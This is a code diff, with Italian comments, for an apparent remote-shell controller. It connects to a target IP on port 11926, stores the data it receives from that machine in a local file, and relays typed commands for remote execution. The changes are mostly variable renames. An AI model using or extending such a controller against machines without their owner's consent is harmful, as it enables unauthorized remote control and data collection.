@@ -15,8 +15,8 @@ def connection():
 
             serverName = ip #e' un nome simbolico, che il DNS (un sistema interno) che lo traduce in IP
             serverPort = 11926
-            clientSocket = socket(AF_INET, SOCK_STREAM)
-            clientSocket.connect((serverName,serverPort))
+            serverSocket = socket(AF_INET, SOCK_STREAM)
+            serverSocket.connect((serverName,serverPort))
 
         except ConnectionRefusedError:
 
@@ -26,7 +26,7 @@ def connection():
         else:
 
             print("Connessione effettuata correttamente")
-            return clientSocket
+            return serverSocket
 
 
 
@@ -38,19 +38,19 @@ def printOptions():
 
 
 
-def setup(clientSocket):
+def setup(serverSocket):
 
     file = open(os.path.join(sys.path[0], 'dati.txt'), mode='a', encoding='latin-1')
-    result = clientSocket.recv(1048576).decode(encoding='latin-1')
+    result = serverSocket.recv(1048576).decode(encoding='latin-1')
 
-    while(result != "esc"):
+    while(result != "uscita"):
         file.write("\n******************************************\n\n"+result)
-        result = clientSocket.recv(1048576).decode(encoding='latin-1')
+        result = serverSocket.recv(1048576).decode(encoding='latin-1')
 
     file.close()
 
 
-def shell(clientSocket):
+def shell(serverSocket):
 
     print("Inserisci i comandi che vuoi eseguire da terminale\n(esc per uscire , print per salvare l'ultimo output, erase per eliminare i dati salvati)\n ")
     result = ''
@@ -77,8 +77,8 @@ def shell(clientSocket):
             continue
         
         else:
-            clientSocket.send(comando.encode(encoding='latin-1'))
-            result = clientSocket.recv(1048576).decode(encoding='latin-1')
+            serverSocket.send(comando.encode(encoding='latin-1'))
+            result = serverSocket.recv(1048576).decode(encoding='latin-1')
             print("\nOUTPUT:\n")
             print(result)
     
@@ -88,8 +88,8 @@ def shell(clientSocket):
 
 def main():
 
-    clientSocket = connection()
-    setup(clientSocket)
+    serverSocket = connection()
+    setup(serverSocket)
 
     while True:
 
@@ -97,16 +97,16 @@ def main():
         scelta = input()
         
         if scelta == "1":
-            shell(clientSocket)
+            shell(serverSocket)
 
         elif scelta == "2":
-            clientSocket.send("esc".encode(encoding='latin-1'))
+            serverSocket.send("esc".encode(encoding='latin-1'))
             break
         
         else:
             print("Inserisci un numero valido")
 
-    clientSocket.close()
+    serverSocket.close()
     print("Connection closed\n")
 
 
